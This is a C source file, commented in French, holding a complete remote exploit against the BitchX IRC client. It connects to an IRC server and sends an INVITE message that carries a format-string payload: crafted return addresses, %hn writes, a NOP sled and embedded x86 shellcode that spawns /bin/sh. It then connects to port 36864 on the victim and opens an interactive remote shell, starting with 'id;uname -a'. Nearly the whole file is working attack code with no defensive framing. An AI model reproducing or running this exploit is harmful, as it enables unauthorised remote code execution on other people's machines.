#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h> 
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define NOPs 120 /* nombre de nop(\x90) */
#define EAT 44 /* nombre de %08x (44 or 43) */
#define HIGH1 0x1d0 /* 0x177 */
#define HIGH2 0x1e1 /* 0xf1bf */
#define LOW1 0x2ff  /* 0xfff1bf */
#define LOW2 0x3bf /* 0xbffff1bf = adresse qui pointe sur shellcode */

/* FIX shell code ... */
char egg[] =
        "\xeb\x31\x5e\x89\x76\xac\x8d\x5e\x08\x89\x5e\xb0"
        "\x8d\x5e\x0b\x89\x5e\xb4\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\xab\x89\x46\xb8\xb0\x0b\x89\xf3"
        "\x8d\x4e\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c cmd...yeah:o)";

void prise(int leesock);
int connect_tcp(struct in_addr addr,unsigned short port);
int fdprintf(int dafd,char *fmt,...);
struct in_addr victim;
struct in_addr ip;

int main (int argc,char **argv)
{
char recvbuf[1024];
int sockfd;
int i; 
  char a1[100]; 
  char a2[100]; 
  char a3[100]; 
  char a4[100]; 
  char x[1024]; 
  char nop[1024]; 

printf("Anti-Social\n");
printf("Exploit BitchX Baby!\n");

  memset(nop, 0, 1024);/* Remplit de zero => nop */
  memset(a1, 0, 100);  /* Remplit de zero => a1 */
  memset(a2, 0, 100);  /* Remplit de zero => a2 */
  memset(a3, 0, 100);  /* Remplit de zero => a3 */
  memset(a4, 0, 100);  /* Remplit de zero => a4 */
  memset(x, 0, 1024);   /* Remplit de zero => x  */


if (argc != 4)
{
  printf("Usage: %s <irc> <nick> <ip>\n",argv[0]);
  exit(0);
}

  for (i=0; i < NOPs ; i++) /* 80 * 0x90 */ 
  { 
    strcat(nop, "\x90"); 
  }

   for (i=0; i < EAT ; i++) /* 5 * %08x */ 
  { 
    strcat(x, "%08x"); 
  }


  sprintf(a1, "%%%dd", HIGH1 - 16 - 8*EAT - 4*3 - 3); 
  /* 
   * a1 = 0x64 - 16(adresse 0xbffff01c-1f) - 8*EAT(5*%08x) - 4*3(AAAA*3)
   */
  sprintf(a2, "%%%dd", HIGH2 - HIGH1 );
  sprintf(a3, "%%%dd", LOW1 - HIGH2  );
  sprintf(a4, "%%%dd", LOW2 - LOW1 );

if (!host_to_ip(argv[1],&victim))
{
  fprintf(stderr,"Erreur de resolution hostname\n");
  exit(0);
}
if (!host_to_ip(argv[3],&ip))
{
  fprintf(stderr,"Erreur de resolution hostname\n");
  exit(0);
}

if ((sockfd=connect_tcp(victim,6667)) < 0)
{
  printf("service irc close\n");
  exit(-1);
}
else{
  printf("service irc open\n");
  sleep(2);
  fdprintf(sockfd,"nick zerma\r\n");
  sleep(1);
  fdprintf(sockfd,"user zerma zerma zerma : zerma\r\n");
  sleep(5);
  fdprintf(sockfd,"INVITE %s #AA"
         /* #aa ou #aaa */
/* 
0xbfffee94  or 0xbfffeea4
*/
	"\x9c\xee\xff\xbf"  /* 1st addr (RET) */
        "AAAA"              /* %d printf vide */
        "\x9b\xee\xff\xbf"  /* 2nd addr (RET) */ 
        "AAAA"              /* %d printf vide */
        "\x9d\xee\xff\xbf"  /* 3rd addr (RET) */ 
        "AAAA"              /* %d printf vide */
        "\x9e\xee\xff\xbf"  /* 4th addr (RET) */ 
        "%s"                /* EAT*%08x */
        "%s%%hn"            /* copy 1 0xbffff01c => 0x64 */
        "%s%%hn"            /* copy 2 0xbffff01d => 0xf2 */ 
        "%s%%hn"            /* copy 3 0xbffff01e => 0xff */ 
        "%s%%hn%s%s\r\n"    /* copy 4 0xbffff01f => 0xbf */ 
        , argv[2], x, a1, a2, a3, a4, nop, egg); 
sleep(2);
}
printf("Connection sur ip de %s port 36864...\n",argv[2]);
sleep(5);
if ((sockfd=connect_tcp(ip,36864)) < 0)
{
  printf("Exploit failled!! :(\n");
  exit(-1);
}
else{
printf("Ok !!!@@@!!! :o)\n");
fdprintf(sockfd,"id;uname -a:pwd\n");
prise(sockfd);
}
}
/* prise de connection */

void prise(int lesock)
{
int n;
char recvbuf[1024];
fd_set rset;

while (1)
{
  FD_ZERO(&rset);
  FD_SET(lesock,&rset);
  FD_SET(STDIN_FILENO,&rset);
  select(lesock+1,&rset,NULL,NULL,NULL);
  if (FD_ISSET(lesock,&rset))
  {
    n=read(lesock,recvbuf,1024);
    if (n <= 0)
    {
      printf("Connection fermï¿½e\n");
      exit(0);
    }
    recvbuf[n]=0;
    printf("%s",recvbuf);      
  }
  if (FD_ISSET(STDIN_FILENO,&rset))
  {
    n=read(STDIN_FILENO,recvbuf,1024);
    if (n>0)
    {
      recvbuf[n]=0;
      write(lesock,recvbuf,n);
    }
  }
}
}

/* ecrit dans une connection */

int fdprintf(int dafd,char *fmt,...)
{
char mybuffer[4096];
va_list va;

va_start(va,fmt);
vsnprintf(mybuffer,4096,fmt,va);
write(dafd,mybuffer,strlen(mybuffer));
va_end(va);
return(1);
}

/* connextion tcp usage: host port */

int connect_tcp(struct in_addr addr,unsigned short port)
{
struct sockaddr_in serv;
int thesock,flags;

thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
bzero(&serv,sizeof(serv));
memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
serv.sin_port=htons(port);
serv.sin_family=AF_INET;
if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
  return(-1);
else
  return(thesock);
}

/* gethostname */
int host_to_ip(char *hostname,struct in_addr *addr)
{
struct hostent *res;

res=gethostbyname(hostname);
if (res==NULL)
  return(0);
memcpy((char *)addr,res->h_addr,res->h_length);
return(1);
}
/* EOF */
